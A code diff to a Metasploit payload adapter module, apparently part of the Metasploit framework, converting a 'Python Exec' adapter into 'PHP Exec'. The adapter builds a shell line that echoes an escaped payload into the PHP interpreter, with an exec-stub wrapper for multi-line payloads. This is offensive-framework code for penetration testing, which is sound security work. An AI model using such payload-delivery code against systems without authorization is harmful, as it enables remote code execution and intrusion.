@@ -10,14 +10,14 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name' => 'Python Exec',
-        'Description' => 'Execute a Python payload as an OS command from a Posix-compatible shell',
+        'Name' => 'PHP Exec',
+        'Description' => 'Execute a PHP payload as an OS command from a Posix-compatible shell',
         'Author' => 'Spencer McIntyre',
         'Platform' => 'unix',
         'Arch' => ARCH_CMD,
         'License' => MSF_LICENSE,
-        'AdaptedArch' => ARCH_PYTHON,
-        'AdaptedPlatform' => 'python'
+        'AdaptedArch' => ARCH_PHP,
+        'AdaptedPlatform' => 'php'
       )
     )
   end
@@ -30,13 +30,22 @@ module MetasploitModule
     super
   end
 
+  def include_send_uuid
+    true
+  end
+
   def generate(_opts = {})
     payload = super
 
+    escaped_exec_stub = Shellwords.escape(Msf::Payload::Php.create_exec_stub(payload))
+
     if payload.include?("\n")
-      payload = Msf::Payload::Python.create_exec_stub(payload)
+      escaped_payload = escaped_exec_stub
+    else
+      # pick the shorter one
+      escaped_payload = [Shellwords.escape(payload), escaped_exec_stub].min_by(&:length)
     end
 
-    "echo #{Shellwords.escape(payload)} | exec $(which python || which python3 || which python2) -"
+    "echo #{escaped_payload}|exec php"
   end
 end
